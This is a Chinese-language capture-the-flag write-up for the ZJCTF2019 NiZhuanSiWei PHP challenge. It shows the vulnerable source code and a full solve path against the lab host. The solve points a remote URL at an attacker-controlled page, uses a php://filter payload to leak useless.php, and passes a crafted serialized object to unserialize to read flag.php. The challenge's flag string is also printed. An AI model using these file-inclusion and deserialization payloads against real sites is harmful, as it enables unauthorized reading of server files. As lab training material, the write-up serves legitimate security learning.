---
title: ZJCTF2019-NiZhuanSiWei
author: AmtuOrRF
categories: [CTF,Web]
tags: [PHP-Code-Audit]
---
页面源码
```php
<?php
$text = $_GET["text"];  
$file = $_GET["file"];  
$password = $_GET["password"];  
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){  
	echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";  
	if(preg_match("/flag/",$file)){  
		echo "Not now!";
		exit();
	}else{  
		include($file); //useless.php
		$password = unserialize($password);  
		echo $password;  
	}  
}  
else{ highlight_file(__FILE__);  
}  
?>
```



进入if 判断
需要一个公网主机，
```bash
$ ip a
100.x.x.56
$ echo -n "welcome to the zjctf" > index.html
$ php -S 0:80
```
访问 http://100.x.x.56/index.html
页面内容
 ```text
 welcome to the zjctf
 ```


`http://34f7d9d3-6ac7-4ae2-9a5d-807e61559a10.node4.buuoj.cn:81/?text=http://100.x.x.56/index.html`
页面返回
```html
<br><h1>welcome to the zjctf</h1></br>
```



下面这行代码反序列化，应该需要配合`useless.php`里的类进行反序列化漏洞利用
```php
include($file); //useless.php
$password = unserialize($password);
```

利用php://filter 读取源码
`http://34f7d9d3-6ac7-4ae2-9a5d-807e61559a10.node4.buuoj.cn:81/?text=http://100.x.x.56/index.html&file=php://filter/read=convert.base64-encode/resource=useless.php`

```base64
PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=
```
base64 解密
```php
<?php

class Flag{  //flag.php
    public $file;
    public function __tostring(){
        if(isset($this->file)){
            echo file_get_contents($this->file);
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }
    }
}
?>
```

根据 `useless.php`的代码构造exp
```php
<?php

class Flag{
    public $file='flag.php';
}
$obj=new Flag();
echo serialize($obj);
?>
```
运行代码`$ php exp.php`，得到
```bash
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

将结果传给password
`http://34f7d9d3-6ac7-4ae2-9a5d-807e61559a10.node4.buuoj.cn:81/?text=http://100.x.x.56/index.html&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`


得到
```html
<br><h1>welcome to the zjctf</h1></br>

<br>oh u find it </br>

  

<!--but i cant give it to u now-->

  

<?php

  

if(2===3){

return ("flag{858c4f33-1368-464a-bd7f-6c3e7b318917}");

}

  

?>

<br>U R SO CLOSE !///COME ON PLZ
```